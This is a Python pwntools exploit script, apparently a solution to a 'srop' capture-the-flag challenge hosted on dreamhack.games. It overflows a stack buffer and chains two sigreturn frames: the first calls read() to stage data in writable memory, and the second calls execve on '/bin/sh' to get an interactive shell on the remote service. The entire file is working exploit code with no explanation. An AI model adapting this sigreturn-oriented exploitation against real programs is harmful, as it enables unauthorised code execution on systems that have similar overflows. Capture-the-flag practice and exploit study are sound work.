#!/usr/bin/env python3

from pwn import *

exe = ELF("./srop", checksec=False)
context.binary = exe

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.DEBUG:
            gdb.attach(p)
    else:
        p = remote("host1.dreamhack.games", 16744)

    return p

def main():
    p = conn()

    input()

    pop_rax = 0x00000000004004eb
    syscall = 0x00000000004004ec
    frame = SigreturnFrame()
    frame.rax = 0
    frame.rdi = 0
    frame.rsi = 0x601a00
    frame.rdx = 0x200
    frame.rsp = 0x601a00
    frame.rip = syscall

    payload = b'a'*24 + p64(pop_rax) + p64(0xf)
    payload += bytes(frame)
    p.send(payload)

    input("Press ENTER to send payload")

    frame = SigreturnFrame()
    frame.rax = 0x3b
    frame.rdi = 0x601b08
    frame.rsi = 0
    frame.rdx = 0
    frame.rsp = 0x601b08
    frame.rip = syscall
    payload = p64(pop_rax) + p64(0xf) + bytes(frame) + b'/bin/sh'
    print(len(payload))
    p.send(payload)

    p.interactive()

if __name__ == "__main__":
    main()